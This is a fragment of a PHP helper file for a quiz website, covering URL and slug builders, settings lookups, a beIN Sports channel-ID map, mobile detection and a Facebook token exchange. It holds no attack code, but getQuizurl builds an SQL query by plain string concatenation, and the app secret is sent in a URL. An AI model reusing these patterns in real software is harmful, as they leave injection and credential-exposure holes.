        if (!$id)
            $id = Sion("user_id");
    }
    if (strpos($app, "http") !== false)
        return $app;
    if (strpos($id, "http") !== false)
        return $id;
    if (!$app)
        return $St->url;
    return $St->url . "/" . $app . "/" . getSlug($id);
}
function getFileType($f)
{
    $file_type =  pathinfo($f, PATHINFO_EXTENSION);
    $is_video = in_array(strtolower($file_type), array("webm", "mp4", "ogv"));
    $img = $f;
    if ($is_video)
        $img = str_replace($file_type, "jpg", $f);
    return [$is_video, $img, $f];
}
function plang($key, $key2)
{
    global $clang;
    if (!$clang)
        $clang = isv("clang");
    return ($clang ? $key : $key2);
}
function getData($key, $v = -1, $d = "", $do = false)
{
    global $_sdata;
    if ($_sdata) {
        $_sdata  =  json_decode(json_encode($_sdata), true);
        $val = "";
        if (is_array($key)) {
            $val = array_values($key)[0];
            $key = array_keys($key)[0];
        }
        $ar = json_decode($_sdata[$key], true);
        if ($val) {
            if ($v == -1 || $ar && $ar[$val] == $v) {
                if ($v == -1)
                    return ($ar && array_key_exists($val, $ar) ? (is_array($ar[$val]) ? json_encode($ar[$val]) : $ar[$val]) : $d);
                return ($d ? $d : $ar[$val]);
            }
            if ($v == -1) return $d;
            return "";
        }
        if ($v == -1 || $ar && is_array($ar) && in_array($v, $ar) || $_sdata[$key] == $v) {
            if ($v == -1)
                return ($_sdata && $_sdata[$key] ? $_sdata[$key] : $d);
            return ($d ? $d : $_sdata[$key]);
        }
    }
    if ($v == -1 || $do) return $d;
    return "";
}
function  ifSlug($se = false)
{
    $id = isv("vid");
    $app = isv("app");
    if (isv("slug"))
        $id = isv("slug");
    if ($se) {
        if ($app == "quiz")
            return getPost();
        else
            return getAuthor();
    }
    if ($app != "quiz")
        return false;
    return $id;
}
function getQuizurl($id, $img = false)
{
    $post = Sel("quiz", "where id=" . $id);
    $mytitle = "";
    if ($img) {
        return getSet()->url . "uploads/" . ($post->image ? $post->image : $post->frame);
    }
    /*$title = explode("-",str_replace(" ","-",$post->title));
for ($i = 0; $i < count($title); $i++)
$mytitle .= ($i != 0?"-":"").$title[$i];*/
    //return getSet()->url."/".$id."/".$mytitle."";
    return getSet()->url . "" . ($post->slug ? $post->slug : getSlug($post->title)) . "";
}
function BeinId($i)
{
    if ($i == 4) {
        $id = 22181;
        $ch = "bein4herh";
    } else if ($i == 1) {
        $id = 22098;
        $ch = "beinsports1rge";
    } else if ($i == 3) {
        $id = 22138;
        $ch = "bein1ehr";
    } else if ($i == 2) {
        $id = 22147;
        $ch = "bein2hgrrea";
    } else if ($i == 6) {
        $id = 22141;
        $ch = "beinsports6hge";
    } else if ($i == 5) {
        $id = 22140;
        $ch = "beinsports5hyrrhr";
    } else if ($i == 7) {
        $id = 22195;
        $ch = "beinooisois7";
    } else if ($i == 8) {
        $id = 21915;
        $ch = "beinsports8hdgaa";
    } else if ($i == 9) {
        $id = 22143;
        $ch = "beins9dja";
    } else if ($i == 10) {
        $id = 22097;
        $ch = "beinsport10a";
    } else {
        $id = 22148;
        $ch = "bein11hgrrraa";
    }
    return array($id, $ch);
}
function isMobile()
{
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    return (preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i', $useragent) || preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i', substr($useragent, 0, 4)));
}
function getLongAccess($token)
{
    $St = getSet();
    $json = Json("https://graph.facebook.com/oauth/access_token?format=json&method=get&client_id=" . $St->app_id . "&client_secret=" . $St->app_key . "&grant_type=fb_exchange_token&fb_exchange_token=" . $token);
    return $json["access_token"];
}
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') {
    $Port = 'https://';
} else {
    $Port = 'https://';
}
$PUr = $Port . $_SERVER['HTTP_HOST'] . '/';
$FUr = $Port . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$url_ep = explode("/", $FUr);
if (count($url_ep) >= 5) {
    $PUr = $PUr . $url_ep[3];
}
doj();
function isand($s = false, $s2 = 0)
{
    if (stripos(strtolower($_SERVER['HTTP_USER_AGENT']), 'android') !== false) { // && stripos($ua,'mobile') !== false) {
        if ($s and  strpos($_SERVER['HTTP_X_REQUESTED_WITH'], "quizfast")) {
            return true;
        } else if (!$s) {
            return true;
        } else {
            return false;
        }
    }
    if ($s2 == 2) {
        return  "false";
    }
    return false;
}
